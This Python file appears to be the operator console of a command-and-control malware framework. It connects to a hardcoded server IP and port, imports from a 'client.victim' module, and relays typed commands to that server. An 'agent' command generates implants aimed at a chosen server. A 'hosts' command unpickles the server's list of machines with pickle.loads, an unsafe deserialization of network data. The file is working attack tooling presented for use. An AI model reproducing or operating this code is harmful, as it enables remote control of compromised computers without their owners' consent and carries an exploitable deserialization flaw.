from client.victim import recv_msg
from rich import print as rprint
from rich.table import Table
from rich.prompt import Prompt as prompt
import clipboard

import socket
import pickle
import codecs
import re as r
import os
from sys import platform

import generator


# Client Side 

# TODO: conn keepalive
# sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
# Create Client session; listen to server
server_addr = ('198.21.242.142', 1338)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect(server_addr)
    duck = recv_msg(sock).decode()
    print(duck)
    rprint("Connected")
    rprint("Say Something or type quit to exit")
except:
    rprint("Connection Failed")
    exit(0)
while True:
    # Prompt user for input
    msg = prompt.ask('[bold dark_orange]>>')
    if msg == 'quit':
        sock.close()
        exit(0)
    elif msg == 'clear':
        if platform == 'linux':
            os.system('clear')
        elif platform == 'win32':
            os.system('cls')
    elif msg[:5] == 'agent':
        serv_ip = r.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', msg)
        generator.generate_agent(serv_ip.group(0))
    elif msg != '':
        print(msg[5:])
        sock.send(msg.encode())

        # Special case with object being returned instead of string
        if msg == 'hosts':
            # decode object and output it
            unpickled = pickle.loads(codecs.decode(sock.recv(2048*10), "base64"))
            rprint(unpickled)
        else:
            output = sock.recv(1024).decode()
            rprint("[green]%s" %output)